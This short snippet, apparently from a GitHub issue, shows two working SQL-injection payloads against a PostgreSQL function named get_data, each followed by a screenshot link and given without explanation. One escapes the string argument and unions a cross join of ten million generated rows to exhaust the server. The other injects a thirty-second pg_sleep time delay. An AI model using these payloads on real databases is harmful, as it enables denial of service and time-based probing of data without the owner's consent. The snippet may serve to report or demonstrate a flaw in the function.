```sql
select * from get_data('1'' union
(select a1, cast (a1 as varchar), a1
from
(select generate_series a1 from generate_series (1,1000)) t1
cross join
(select * from generate_series (1,1000)) t2
cross join
(select * from generate_series (1,10)) t3) -- ');
```

![image](https://user-images.githubusercontent.com/26124396/209225306-178d1092-b537-4ecb-a470-9784708eb17b.png)

```sql
select * from get_data('1'' or exists (select 1 from pg_sleep(30)) -- ');
```

![image](https://user-images.githubusercontent.com/26124396/209225967-494f197b-3670-4c8a-bb63-0f243f874e5c.png)
